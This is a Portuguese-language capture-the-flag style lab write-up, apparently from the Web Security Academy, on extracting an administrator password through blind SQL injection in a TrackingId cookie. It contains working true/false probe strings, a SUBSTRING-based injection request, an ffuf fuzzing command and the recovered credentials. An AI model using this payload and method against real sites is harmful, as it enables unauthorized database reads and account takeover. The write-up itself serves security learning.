## Objetivo
account takeover de administrator usando SQL blind para enumerar a senha correta 

## Vulnerabilidade Identificada
O database é vulneravel a blind SQLi. fiz o teste identificando com ``' AND '1'='1`` quando verdadeiro retornava ``Welcome back!``
<br>
<img width="1832" height="844" alt="Screenshot From 2026-04-28 10-55-11" src="https://github.com/user-attachments/assets/cf478b26-b8ed-4d3f-91ae-833f0a4aad2a" />

<br>

``' AND '1'='2`` quando falso não retornava nada.
<br>
<img width="1832" height="844" alt="Screenshot From 2026-04-28 10-54-59" src="https://github.com/user-attachments/assets/37776e51-ccf2-48f6-af12-fe5da875853e" />

<br>

## Metodologia
Após criar uma wordlist de a-z, 0-9 & A-Z; chamada de testefuz.txt
criei uma req.txt para alocar o header do cookie com o SQLi porque estava dando conflito com o shell, o conflito era escape de aspas simples dentro de aspas duplas no bash.
rodei a ffuf attack-line com -mr para filtrar TRUE
eu não sabia o tamanho da senha, fiz posição por posição até posição 21 retornar falso.

## Comandos Utilizados

req.txt
```bash
GET / HTTP/1.1
Host: 0a9400cc041747268a03d1c0004e0088.web-security-academy.net
Cookie: TrackingId=UlbhysnCI2s0Y0Xa' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 1, 1)='FUZZ'--; session=T0OqtktX9rjqZymrNRSDwRK3928WmUD4
```

ffuf attack-line
```bash
ffuf -w /home/luweed/Documents/testefuz.txt:FUZZ \
     -request /home/luweed/Documents/req.txt \
     -request-proto https \
     -mr 'Welcome back!' 
```

ultima req.txt (retornou falso)
```bash
GET / HTTP/1.1
Host: 0a9400cc041747268a03d1c0004e0088.web-security-academy.net
Cookie: TrackingId=UlbhysnCI2s0Y0Xa' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 21, 1)='FUZZ'--; session=T0OqtktX9rjqZymrNRSDwRK3928WmUD4
```


## Resultado
user: administrator   password:qz2sh0300ncta8lxouwv

## Lições Aprendidas

Aprendi a usar ffuf para fazer enumeração de senha com blind SQLi. Apesar que eu sei que o sqlmap é capaz de automatizar esses tipos de tarefa. 
foi importante porque aprendi a lógica por trás e a como testar se o parâmetro está sem sanitização fazendo uma injeção simples de verdadeiro ou falso  





